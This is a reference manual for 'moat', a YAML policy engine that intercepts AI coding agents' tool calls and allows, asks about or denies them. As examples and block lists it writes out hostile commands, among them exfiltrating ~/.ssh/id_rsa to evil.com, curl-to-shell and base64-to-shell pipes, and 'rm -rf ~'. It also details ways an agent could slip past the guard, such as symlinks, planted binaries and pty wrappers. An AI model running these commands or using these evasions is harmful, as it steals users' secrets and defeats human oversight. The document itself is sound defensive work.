# Policy reference (schema v1)

A policy is a YAML document that tells `moat` what an agent may do. The installed
user policy lives at `~/.moat/policy.yaml` (or `$MOAT_HOME/policy.yaml`).
`moat init` writes the default; `moat policy lint` validates; `moat policy check`
explains a decision.

## 1. Shape

```yaml
version: 1                          # required; only 1 is supported

defaults:                           # verdict when no rule matches
  "*": ask                          #   one verdict for everything, or a map per kind
  net: deny                         #   keys other than the seven kinds and "*" are accepted but never consulted

deny:   [ <rule group>, … ]         # evaluated first; a match here is final
allow:  [ <rule group>, … ]         # evaluated second
ask:    [ <rule group>, … ]         # evaluated third

executables:                        # pin program names to absolute paths (enforced, see §8.1)
  git: ["/usr/bin/git", "/opt/homebrew/bin/git"]
```

`approval:` (`channel`, `remember`, `timeout_s`) and `scope:` (`project_roots`) are reserved:
they are accepted so older policy files stay valid, have no effect yet, and `moat policy lint`
says so. Approvals are made with `moat allow` (§8.2); the project root is the git root of the
call's working directory (§3.2).

Unknown keys are rejected. Rule ids must be unique across all three lists and must
not be empty; a rule group must contain at least one pattern.

## 2. Rule groups

```yaml
- id: secrets-paths                 # stable id; shown to the agent and stored in the audit log
  reason: secret material           # optional; prefixed to the explanation
  fs.read:  ["~/.ssh/**", "**/.env"]
  fs.write: ["~/.ssh/**"]
  shell:    ["curl * | sh"]
  net:      ["*.evil.example"]
  env.read: ["*_TOKEN"]
  env.set:  ["PATH", "LD_PRELOAD"]
  mcp:      ["mcp__shell__*"]
```

A group matches when **any** of its patterns matches an atomic action of the same
kind. One tool call usually produces several atomic actions (see §4).

| Kind | Matched against | Pattern language |
|---|---|---|
| `shell` | the normalised argument vector of a command, and of every pipeline suffix | token sequence (§3.1) |
| `fs.read`, `fs.write` | the canonical absolute path | glob (§3.2) |
| `net` | the host name only (no scheme, port or path), lowercase | glob, case-insensitive |
| `env.read`, `env.set` | the variable name | glob |
| `mcp` | the full MCP tool name `mcp__<server>__<tool>` | glob |

## 3. Pattern syntax

### 3.1 Shell patterns
Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.

- Each token is a glob matched against exactly one argument: `git push --force*` matches `git push --force-with-lease`.
- git's global options are the one normalisation: `git -C dir push --force`, `git -c k=v reset --hard` and `git --git-dir=x push …` are matched as `git push --force`, `git reset --hard` and `git push …`, and `-C`/`--git-dir`/`--work-tree` values are `fs.read`s. A `-c`/`--config-env` key outside a short inert list (`color.*`, `user.name`, `core.quotepath`, …), `--exec-path=` or an unknown global option can make git run a program (`core.fsmonitor`, `core.hooksPath`, `alias.*`, `credential.helper`, `include.path`, …), so the command is also checked as written, which no `git <subcommand>` allow matches.
- Tokens are compared as written; flags are not normalised. `rm -rf ~` does not match `rm -fr ~` or `rm -r -f ~`; list every spelling you mean.
- A bare `*` matches **any number** of arguments, including none: `sudo *` matches `sudo`, `curl * | sh` matches `curl -fsSL https://x | sh -s`.
- A pattern is a **prefix**: `git status` also matches `git status --short`.
- A leading `!` makes the pattern an exclusion within its list, as for globs (§3.2): `shell: ["find *", "!find * -exec*"]` allows `find . -name x` but not `find . -exec rm {} \;` (ADR-012).
- A trailing bare `$` ends the match: the command must have no further arguments. `env $` matches `env` alone, not `env FOO=1 git status`; `export -p $` matches `export -p` but not `export -p FOO`. A `$` anywhere else is an ordinary token, and a pattern that is only `$` is rejected by the linter (ADR-010).
- Pipelines and lists are matched per command **and** as whole suffixes, so `base64 -d | sh` is caught in `echo … | base64 -d | sh`. `|&` (pipe stdout and stderr) is a `|`.
- A decoder stage that feeds an interpreter reading stdin, anywhere later in the same pipe chain, is also reported as the canonical pipeline `<decoder> -d | <interpreter>` (`base64 -D x | tr a b | bash -s` → `base64 -d | bash`), so one rule `* -d | bash` covers every decoder spelling. An interpreter given a script file or inline code (`bash build.sh`, `sh -c …`) is not reading its program from stdin and does not produce it.
- Commands inside `sh -c "…"`, `eval`, `$( … )`, backticks, subshells and wrappers (`sudo`, `env`, `xargs`, `timeout`, `nohup`, …) are classified as their own commands.
- A `<<<` here-string is the command's stdin, not a file: `cat <<< ~/.ssh/id_rsa` prints text and reads nothing. `$( … )` and `$VAR` inside it are evaluated like anywhere else (`cat <<< "$(curl …)"`, `curl -d @- … <<< "$GITHUB_TOKEN"`), and a shell or interpreter that reads its program from stdin runs it (`bash <<< 'cat ~/.ssh/id_rsa'` is classified as `cat ~/.ssh/id_rsa`).
- A here-document body is stdin data too. With an unquoted delimiter the shell expands `$( … )`, backticks and `$VAR` in it, so they are evaluated (`cat <<EOF` with a `$(curl …)` line is a network action); a quoted delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`) keeps the body literal. Either way a shell or interpreter reading its program from stdin runs the body (`bash <<'EOF'` is classified as the commands in it).
- A shell's options are read the way the shell reads them, for `sh`, `bash`, `zsh`, `dash`, `ksh` and `fish`: `c` anywhere in a cluster (`bash -lc`, `sh -ec`, `zsh -ic`), long options (`--login`, `--norc`, `--rcfile FILE`), options that take a value (`-o pipefail`, `+O extglob`) and `--` all lead to the same command string, which is classified on its own. `bash -o pipefail` reads its program from stdin; `pipefail` is not a script. An option the classifier does not know for that shell (`bash --frobnicate -c …`) makes the command `unparseable`, because it could consume the command string.
- `make` (and `gmake`) arguments that run code of the caller's choosing become their own `make <argument>` shell action, so a `make test*` allow does not cover them: `--eval`/`-E` text, `-e`/`--environment-overrides`, and the variables `SHELL`, `.SHELLFLAGS`, `MAKESHELL`, `MAKEFLAGS`, `MFLAGS`, plus any `NAME!=command`. The `--eval` text, `!=` commands, `$(shell …)` calls in variable values and the `SHELL=` program are classified as commands; `--file=`, `--makefile=`, `--directory=` and `--include-dir=` values are file reads. `make build -j4 CC=clang` is unaffected.

### 3.2 Path, host and name globs
- `*` matches within one path segment; `**` matches across segments: `~/.ssh/**`, `**/.env.*`.
- Hosts are matched lowercase without userinfo, port, trailing dot or IPv6 brackets (`http://u@[::1]:8080/` is `::1`). A word with a scheme is always a URL, so `http://localhost`, `http://intranet` and numeric forms such as `http://2130706433/` are network actions; a word without a scheme counts only as a dotted name under a known top-level domain or an IPv4 address.
- `~` and `${project}` are expanded in patterns before matching; `${project}` is the git root above the call's working directory (or the directory itself when there is no repository). `$HOME` and `${HOME}` are expanded in the *action's* path (so `cat $HOME/.ssh/id_rsa` is seen as `~/.ssh/id_rsa`) but not in patterns: write `~` in rules.
- A leading `~name` in an action's path is a home directory, as the shell expands it: `~me/x` is `~/x` when `me` is the last component of your home directory, and any other `~name` is the directory `name` next to your home (`/Users/name`, `/home/name`, `C:/Users/name`), so `cat ~alice/.ssh/id_rsa` is a read of `/Users/alice/.ssh/id_rsa`, never of `<cwd>/~alice/…`. `~+` is the working directory. `~-` (the shell's previous directory) cannot be known, so a command naming it asks with rule `unparseable`. Homes laid out differently (root's `/root` on Linux) are not modelled: `~root/x` is read as `/root/x` only when your home is next to it.
- The project root is never the home directory, one of its ancestors or a filesystem root (`/`, `C:/`, a UNC share), compared as written and with symlinks resolved. A git root that is one of these (a dotfiles repository in `~`) is skipped in favour of the working directory itself; when that is one too (a session started in `~` or `/`), the call has **no project**: every pattern naming `${project}` matches nothing (and a negated one excludes nothing), so project-scoped allows do not apply and those actions fall through to `ask` and the defaults. Deny rules are unaffected. `moat policy check --project ~` is refused with exit 64.
- A pattern ending in `/**` also matches the directory itself: `~/.ssh/**` matches `~/.ssh`, so a recursive read (`grep -r . ~/.ssh`, `tar czf k.tgz ~/.ssh`) or a removal (`rm -rf ~/.gnupg`) of the directory meets the rule that guards its contents, and `!${project}/.git/**` also excludes `.git` itself.
- A leading `!` excludes matches within the same list of the same group, in `deny`, `allow` and `ask` alike: a candidate matches when at least one positive pattern matches and no negated pattern does. Example: `fs.write: ["${project}/**", "!${project}/.git/**"]`.
- Paths are compared in slash-separated canonical form on every platform (`C:/Users/me/x` on Windows, never the `\\?\C:\…` verbatim form), case-insensitively on macOS and Windows.

## 4. How a decision is made

```
tool call ──► atomic actions ──► per action: deny → allow → ask → defaults ──► strictest wins
```

1. The host's tool call becomes one `Action` (shell command, file read, file write, URL, MCP tool).
2. The classifier expands it into atomic actions. `curl -d @~/.ssh/id_rsa https://evil.com` becomes a `shell` action, an `fs.read` of `~/.ssh/id_rsa` and a `net` action for `evil.com`.
3. Each atomic action is evaluated in order `deny → allow → ask`; the first list containing a match decides it. If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > allow`.
5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB, more than 2048 atomic actions) is `ask` with rule id `unparseable`, never `allow`.

Consequences worth remembering:

- **Deny is absolute.** No allow rule can override a deny rule. To express "nothing of this kind except these", use `defaults` plus allow rules, as the default policy does for `net`.
- An allow rule on `shell` does not allow the paths or hosts the command touches; those are evaluated separately. `cat ~/.ssh/id_rsa` is denied by the path rule even though `cat *` is allowed.
- Arguments that name files become `fs.read`/`fs.write` actions even when they are relative: any word containing `/` (`s/id_rsa`, `src/main.rs`, the value of `--in=keys/k`), and every operand of programs that read or write their operands (`cat`, `head`, `tail`, `less`, `grep`, `rg`, `wc`, `diff`, `base64`, `tar`, `ls`, `find`, `cp`, `mv`, `rm`, `tee`, … ; `shell/tables.rs`), so `cat k` is a read of `<cwd>/k`. Options before `--`, URLs, remote specs (`host:dir`) and the arguments of `echo`/`printf` are not files. Inside the project these reads cost nothing (`project-fs` allows them); an option value such as the `5` in `head -n 5 f` becomes a harmless read of `<cwd>/5`.
- Relative paths follow `cd` and `pushd` earlier in the same command line: `cd ~/.ssh && cat id_rsa` is a read of `~/.ssh/id_rsa`. Which commands run after a `cd` succeeds is not modelled (`cd x || cat y`, a failed `cd` before `;`), so a relative path is checked in every directory the line may be in (the session's directory and each `cd` target), strictest wins. A subshell `( … )` restores the directory when it closes; `$( … )` and `sh -c` start from the directory where they appear. `cd` alone is `~`. A target that cannot be known (`cd "$DIR"`, `cd -`, `cd s*`, `pushd +1`, `popd`, and `eval`/`source`, which may `cd` themselves) makes every later relative path unresolvable, so the command asks with rule `unparseable`; absolute paths are still checked normally. More than 16 possible directories also asks. `cd` itself adds no new action (a path-looking target is an `fs.read` like any argument), and `CDPATH` is not consulted.
- `moat guard` checks a path where it really points as well as where it was written: after `ln -s ~/.ssh ./s`, `cat ./s/id_rsa`, `cat s/id_rsa`, `head s/id_rsa` and `grep -r . s/` are denied by `secrets-paths`. A link inside the project that points elsewhere inside the project stays allowed. `moat policy check` resolves symlinks the same way. Hard links and a link swapped after the check are not seen (ADR-009).
- The explanation names the rules that produced the final verdict; weaker matches are shown as context (`also:` lines, `context` in JSON).

## 5. Verdicts and what the host does

The verdict is the same for every host; the response document is the host's own format.

| Host event | `allow` | `ask` | `deny` |
|---|---|---|---|
| Claude Code and Codex `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"moat: allow [rule]"}}`, exit 0 | same with `"ask"`, exit 0; the host prompts the user with the reason | same with `"deny"`, reason also on stderr, exit 2; the agent sees the rule id and reason |
| Cursor `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `preToolUse` | `{"permission":"allow","user_message":"moat: allow [rule]","agent_message":"…"}`, exit 0 | `"permission":"ask"`, exit 0 | `"permission":"deny"`, exit 2 |
| Claude Code `ConfigChange` | `{}` (the changed settings file is loaded), exit 0 | not produced | `{"decision":"block","reason":"moat: deny [kernel-integrity] — …"}`, exit 2; the session keeps its previous settings |

The reason line has the shape `moat: <verdict> [rule, rule] — reason; reason`.

### 5.1 Rule ids that are not in your policy

These appear in responses and in `moat show` alongside the ids from `policy.yaml`:

| Rule id | Verdict | When |
|---|---|---|
| `default`, `default.<kind>` | from `defaults` | no rule matched the atomic action |
| `unparseable` | ask | the shell command or URL could not be classified safely (§4 step 5) |
| `executables` | deny | the command's program resolves to a path other than its pin (§8.1) |
| `kernel-integrity` | deny | a file pinned by `policy.lock` changed, disappeared or was replaced by a symlink (§8); every action is denied until a person re-pins |
| `kernel-error` | deny | `moat guard` could not evaluate at all: missing state directory, malformed payload, unreadable policy; exit 2 |
| `ungoverned` | allow | the host tool is outside policy scope (for example Claude Code `Task`, or `Shell` under Cursor's `preToolUse`, which `beforeShellExecution` already governs); recorded, not evaluated |
| `config-change` | allow | a Claude Code `ConfigChange` for a settings file that is not pinned, or still matches the lock; a change that names no file is allowed only while every pinned file matches the lock; recorded |
| `approved-session` | allow | an `ask` for a shell command that a person granted with `moat allow` for this host session (§8.2) |
| `approved-<n>` | allow | a permanent rule in `~/.moat/policy.d/approved.yaml` written by `moat allow --always` |

## 6. The default policy, in one table

| List | Rule id | What it covers |
|---|---|---|
| deny | `secrets-paths` | read **and** write of `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.config/gh`, `~/.netrc`, `~/.docker/config.json`, `~/.config/gcloud`, `~/.azure`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials{,.toml}`, `~/.zsh_history`, `~/.bash_history`, `.env`, `.env.*` (except `.env.example`, `.env.sample`, `.env.template`), `.envrc`, keychains |
| deny | `env-secrets` | reading `*_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `AWS_*`, `GITHUB_TOKEN`, `NPM_TOKEN` |
| deny | `env-dump` | `env`, `printenv`, `set`, `export`, `declare`, `typeset` with no arguments (or only `-0`, `-p`, `-x`), also by absolute path: they print every variable, secrets included. `printenv NAME` is an `env.read` of `NAME` |
| deny | `env-poison` | setting `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `NODE_OPTIONS`, `PYTHONPATH`, `GIT_*`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `MOAT_*` |
| deny | `pipe-to-shell` | `curl`/`wget` output, or any decoded/decompressed stream (`base64 -d/-D/--decode`, `openssl … -d`, `xxd -r`, `gunzip`, `zcat`, `gzip -d`, …), piped into a shell or interpreter that reads its program from stdin (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `python*`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `pwsh`); `eval` |
| deny | `destructive` | `rm -rf /`, `rm -rf /*`, `rm -rf ~`, `rm -rf ~/*`, `rm -rf $HOME` (and `-fr`, `--no-preserve-root`), `git push --force*`/`-f*` (also after the remote, bundled as `-uf`, and a `+refspec` such as `+main` or `+HEAD:main`), remote branch deletion (`git push origin :main`, `--delete`, `-d`), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git stash drop/clear`, `sudo`, `mkfs`, `dd if=`, `shutdown`, `reboot` |
| deny | `kernel-self` | writes to `~/.moat`, `~/.codex`, host hook/settings files, and to the directories `~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor` (and `.moat`, `.claude`, `.codex`, `.cursor` anywhere) themselves, so they cannot be renamed, deleted or replaced by a link; any `bin/moat` or `bin/moat.exe` (the binary every hook runs); `moat policy/init/doctor/allow` from an agent, also by absolute path (`*/moat …`) and under the pseudo-terminal wrappers `script`, `expect`, `unbuffer` (ADR-011), also by absolute path, Python `pty.spawn(…)`, `tmux`/`screen` and `osascript` (ADR-014) |
| deny | `shell-rc` | writes to `~/.zshrc`, `~/.bashrc`, `~/.profile` and friends |
| allow | `project-fs` | read anywhere in `${project}`, including the root itself (a search with no path); write anywhere except `.git/` and `.moat/` |
| allow | `dev-shell` | `git status/diff/log/show/branch/add/commit/checkout -b/switch/fetch/pull/stash`, `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `pwd`, `echo`, `which`; `npm test/run`, `pnpm test/run/build/lint/typecheck/exec`, `yarn test/run/build/lint/exec`, `npm exec`, `cargo build/test/check/clippy/fmt/run/doc/bench/nextest/tree/metadata`, `go test/build/vet`, `swift test/build`, `pytest`, `make test/build/check/lint`. `exec` forms are allowed only because the wrapped program is evaluated on its own. Excluded (they ask): `find -exec/-ok/-delete/-fprint/-fls`, `rg --pre`, `git --upload-pack/--receive-pack`, `go -exec/-toolexec/-vettool`, `cargo --config` |
| allow | `dev-readonly` | `wc`, `diff`, `tree`; `docker ps/images/logs/version`; `gh pr view/list/diff/checks`, `gh issue view/list`, `gh run list/view`, `gh repo view` (not with `--output`/`-o`); reading `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LANG`, `TERM`, `TMPDIR`, `EDITOR`. `sed` is not listed: a sed script can run commands (`e`) and write files (`w`) |
| allow | `dev-tools` | `tsc`, `eslint`, `prettier`, `biome`, `vitest`, `jest`, `mocha`, `ruff`, `black`, `mypy`, `golangci-lint` |
| allow | `registries` | `api.github.com`, `github.com`, npm, crates.io, Go proxy, PyPI |
| allow | `safe-mcp` | read-only GitHub and filesystem MCP tools |
| ask | `installs` | `npm install/i/ci`, `pnpm add/install/dlx`, `yarn add/install/dlx`, `npx`, `pip install`, `cargo add/install`, `brew install`, `gem install` |
| ask | `local-net` | network to `localhost`, `127.0.0.1`, `::1` (a local service may expose a control API) |
| ask | `push` | `git push`, `npm/pnpm/yarn publish`, `cargo publish`, `gh release` |
| defaults | `default`, `default.net` | everything else asks; outbound network to unlisted hosts is denied |

MCP calls are judged by name **and** by what their arguments touch: adapters map path-like arguments (`path`, `paths`, `file_path`, `source`, `destination`, …) to `fs.read`/`fs.write` atoms (write for `write_*`, `edit_*`, `move_*`, `delete_*`-shaped tools and for `destination`/`target`) and URL-like arguments (`url`, `uri`, `endpoint`) to `net` atoms, so `mcp__filesystem__read_file {path: ~/.aws/credentials}` is denied by `secrets-paths` even though `safe-mcp` allows the tool name. Arguments are searched at any depth (`{"options": {"path": …}}`), URL arguments count with or without a scheme, and arguments that cannot be read (a Cursor `tool_input` string that is not JSON, more than 1024 paths and URLs) deny the call instead of letting the name decide alone.

## 7. Recipes

Allow your company's package registry:
```yaml
allow:
  - id: company-registry
    net: ["npm.internal.example.com", "pypi.internal.example.com"]
```

Let the agent deploy with one script but nothing else in that directory:
```yaml
allow:
  - id: deploy-script
    shell: ["./scripts/deploy.sh *"]
deny:
  - id: deploy-dir
    fs.write: ["${project}/scripts/**"]
```

Make every `git push` require approval, even to `origin HEAD`:
```yaml
ask:
  - id: push
    shell: ["git push *"]
```

Check what a policy would do before installing it:
```bash
moat policy lint ./policy.yaml
moat policy check "npm install left-pad" --policy ./policy.yaml --project ~/code/app
moat policy check "~/.aws/credentials" --kind fs-read --policy ./policy.yaml
```

`policy lint` fails (exit 64) on errors: wrong version, unknown keys, missing or duplicate
ids, empty rules, bad globs or shell patterns, `executables` paths that are not absolute
(`/usr/bin/git` or `C:/…`). It prints warnings, and still exits 0, for rules that cannot
decide anything because an earlier list already matches everything they match: an `ask`
pattern covered by an `allow` pattern (allow is evaluated first, e.g. allow `cargo *` makes
ask `cargo publish*` unreachable), an `allow` pattern covered by a `deny` pattern, and
`defaults` keys that are not a known kind (`netw: deny` is silently ignored otherwise). The
check is conservative: a list with `!` exclusions is never assumed to cover anything, so no
warning does not prove a rule is reachable.

## 8. The policy lock

`moat init` records SHA-256 digests of the policy file and of every host hook file it
installed in `~/.moat/policy.lock`. `moat guard` recomputes them on every call; if any
pinned file changed or disappeared, every action is denied with rule `kernel-integrity`
until a person re-pins with `moat doctor --accept` (refused outside an interactive terminal) or
by re-running `moat init`. Edit the policy, then run `moat doctor --accept`. A pinned file is identified by its location, so replacing it with a symlink, or re-pointing an existing link, counts as a modification even when the bytes read through it are unchanged. The same holds for a directory on its path: if `~/.claude` is moved and replaced by a link to a copy, `settings.json` resolves somewhere else and is reported as modified.

### 8.1 Executable pinning and the environment snapshot

`moat init` also records the search path and the absolute location of common programs
(`git`, `npm`, `node`, `python3`, `cargo`, `curl`, `ssh`, `sudo`, …) in
`~/.moat/environment.json`, pinned by the lock. For every shell command, the first word is
resolved through that snapshot, never through the environment the hook inherited. If the
program is pinned, either by `executables:` in the policy or by the snapshot, and it now
resolves somewhere else (a `git` planted in `node_modules/.bin`, an absolute path to a copy
in `/tmp`), the command is denied with rule `executables`. Unpinned programs are not checked.
After installing a tool in a new location, re-run `moat init` or `moat doctor --accept`.

On Windows the snapshot also records `PATHEXT`; a bare program name resolves as written, then with each recorded extension in order (default `.com`, `.exe`, `.bat`, `.cmd`).

`moat policy check` decides the way `guard` does: it resolves programs through the snapshot
when `~/.moat/environment.json` exists and resolves symlinks in checked paths. Without an
installation, installation pins are not consulted and a program pinned under `executables:`
is reported as "not found on the kernel search path" unless the command names it by
absolute path. Checked against the installed policy (no `--policy`), it also verifies
`policy.lock` first and, when a pinned file changed, reports the `kernel-integrity` deny
(exit 2) that `guard` answers instead of the policy's verdict.

## 8.2 Approvals

When a host prompts you because the verdict was `ask`, you can make the answer stick:

```bash
moat allow --last                  # grant the most recent ask to that host session (exact command)
moat allow --last --always         # or add a permanent allow rule
moat allow "npm install left-pad" --host claude-code --session 7c1e
```

Session grants live in `~/.moat/approvals.json` and match the exact command text for
one host session. A grant applies to any `ask` for that command, including an
`unparseable` one; it never overrides a `deny`. Permanent rules are appended to
`~/.moat/policy.d/approved.yaml` with ids `approved-1`, `approved-2`, … and a provenance
comment, and are merged into your policy at load time so `policy.yaml` is never rewritten.
The command is stored as a literal pattern: glob characters and `$` are escaped (`cat *` is
stored as `cat [*]` and approves only a literal `*`), and ids are numbered one past the
highest existing `approved-N`, so deleting a rule never causes a duplicate id. Shell rules
are prefixes, so a permanently approved `npm install left-pad` also allows extra arguments
after it; edit the overlay if you want it tighter. Both files are pinned
by the lock; `moat allow` must be run from a terminal and is denied to agents.

## 9. Planned, not yet available

Repository-level policy (`<repo>/.moat/policy.yaml`) with explicit trust, managed
organisation policy, and Telegram approvals. Status and order:
`PROGRESS.md`.
